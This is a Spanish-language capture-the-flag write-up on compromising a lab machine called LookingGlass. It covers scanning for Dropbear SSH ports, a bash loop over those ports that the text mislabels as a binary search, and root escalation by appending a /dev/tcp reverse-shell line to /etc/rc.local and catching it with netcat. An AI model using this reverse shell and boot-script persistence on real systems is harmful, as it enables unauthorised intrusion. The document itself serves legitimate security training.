LookingGlass

Múltiples puertos SSH con Dropbear como pista para encontrar el puerto correcto. Acceso via SSH key y escalada con sudo.

Ago 2022 ~45 min cat4clysm
Herramientas utilizadas
nmap ssh bash scripting

Reconocimiento

El escaneo revela docenas de puertos SSH con Dropbear además del SSH estándar en el 22.

root@kali:~$
nmap -sC -sV -p- -Pn 10.10.202.90
22/tcp    open  ssh      OpenSSH 7.6p1
9000/tcp  open  ssh      Dropbear sshd
9001/tcp  open  ssh      Dropbear sshd
9002/tcp  open  ssh      Dropbear sshd
...
13999/tcp open  ssh      Dropbear sshd
Cada conexión SSH a los puertos Dropbear devuelve un mensaje: "Lower" o "Higher" — es un juego de búsqueda binaria para encontrar el puerto correcto.

Encontrando el puerto correcto

Script bash para hacer búsqueda binaria entre los puertos Dropbear:

root@kali:~$
for port in $(seq 9000 14000); do
  result=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 jabberwock@10.10.202.90 -p $port 2>&1)
  echo "$port: $result"
  if echo "$result" | grep -q "You've found"; then
    echo "PORT FOUND: $port"
    break
  fi
done

Al conectar al puerto correcto obtenemos una clave SSH privada y el nombre de usuario.

root@kali:~$
ssh -i id_rsa jabberwock@10.10.202.90

whoami
jabberwock

Escalada de privilegios

Revisamos sudo y encontramos un binario aprovechable:

sudo -l
(root) NOPASSWD: /sbin/reboot

Encontramos un script en /etc/rc.local que se ejecuta al reiniciar como root. Lo modificamos para obtener una reverse shell:

echo "bash -i >& /dev/tcp/LHOST/4444 0>&1" >> /etc/rc.local
sudo /sbin/reboot
# En nuestra máquina:
nc -lvnp 4444
whoami
root

Lecciones aprendidas

  • El escaneo completo de puertos (-p-) es crucial — los servicios en puertos altos no convencionales pueden ser la clave.
  • rc.local persiste entre reinicios y se ejecuta como root — siempre verificar si es escribible.
  • La búsqueda binaria es una técnica eficiente para reducir el espacio de búsqueda en retos de este tipo.
